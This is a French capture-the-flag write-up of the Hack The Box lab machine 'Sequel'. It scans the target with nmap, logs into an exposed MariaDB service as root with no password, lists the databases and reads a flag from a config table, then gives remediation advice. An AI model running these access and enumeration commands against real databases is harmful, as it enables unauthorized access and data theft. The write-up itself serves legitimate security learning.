# HTB — Sequel (Starting Point)

**Difficulté :** Very Easy
**OS :** Linux
**Catégorie :** Starting Point

## Résumé

Sequel est une machine d'introduction axée sur l'énumération directe d'un service **MySQL/MariaDB** exposé, autorisant une connexion en tant que `root` sans mot de passe, ce qui permet de naviguer librement dans les bases de données et de récupérer le flag.

## 1. Connexion au VPN

Connexion au lab HTB via OpenVPN (pool *Starting Point*), puis vérification de la connectivité :

```bash
ping -c 5 <IP_cible>
```

## 2. Reconnaissance / Scan de ports

```bash
sudo nmap -sC -sV <IP_cible>
```

Résultat :

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.5-10.3.27-MariaDB-0+deb10u1
```

Seul le port **3306/tcp** est ouvert, exécutant un service **MySQL/MariaDB**.

## 3. Foothold — connexion au service MySQL

Installation du client si nécessaire :

```bash
sudo apt update && sudo apt install mysql*
```

Comme il peut exister une mauvaise configuration autorisant une connexion sans mot de passe, on teste directement en tant que `root` :

```bash
mysql -h <IP_cible> -u root
```

La connexion est acceptée sans mot de passe, plaçant l'utilisateur dans un shell MySQL (`MariaDB [(none)]>`).

## 4. Énumération des bases de données

Commandes de navigation utilisées :

```sql
SHOW databases;
USE {nom_de_la_base};
SHOW tables;
DESCRIBE {nom_de_la_table};
SELECT * FROM {nom_de_la_table};
```

Listage des bases disponibles :

```
MariaDB [(none)]> SHOW databases;

+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

La base `htb` sort du lot (bases non standards). Sélection de celle-ci :

```
MariaDB [(none)]> USE htb;
Database changed
```

## 5. Récupération du flag

Listage des tables de la base `htb` :

```
MariaDB [htb]> SHOW tables;

+----------------+
| Tables_in_htb  |
+----------------+
| config         |
| users          |
+----------------+
```

Lecture complète de la table `config` :

```
MariaDB [htb]> SELECT * FROM config;

+----+---------------------+----------+
| id | name                | value    |
+----+---------------------+----------+
|  1 | timeout             | 60s      |
|  2 | security            | default  |
|  3 | auto_logon          | false    |
|  4 | max_size            | 2M       |
|  5 | flag                | <valeur> |
|  6 | enable_uploads      | false    |
|  7 | authentication_method | radius |
+----+---------------------+----------+
```

La ligne `flag` contient la valeur recherchée.

## Conclusion

Cette machine illustre un risque classique sur les services de bases de données : un compte `root` sans mot de passe, accessible directement depuis le réseau. Une fois la connexion établie, il n'existe aucune barrière empêchant la lecture de toutes les données stockées, y compris potentiellement des identifiants, clés ou informations sensibles. La remédiation consiste à toujours définir un mot de passe fort pour les comptes administratifs, restreindre les hôtes autorisés à se connecter (`bind-address`, règles de pare-feu) et ne jamais exposer un service de base de données directement sur Internet.

## Résumé des commandes

| Étape | Commande |
|---|---|
| Scan de ports/versions | `sudo nmap -sC -sV <IP>` |
| Connexion MySQL (root sans mdp) | `mysql -h <IP> -u root` |
| Lister les bases | `SHOW databases;` |
| Sélectionner une base | `USE <base>;` |
| Lister les tables | `SHOW tables;` |
| Voir les colonnes d'une table | `DESCRIBE <table>;` |
| Lire le contenu d'une table | `SELECT * FROM <table>;` |
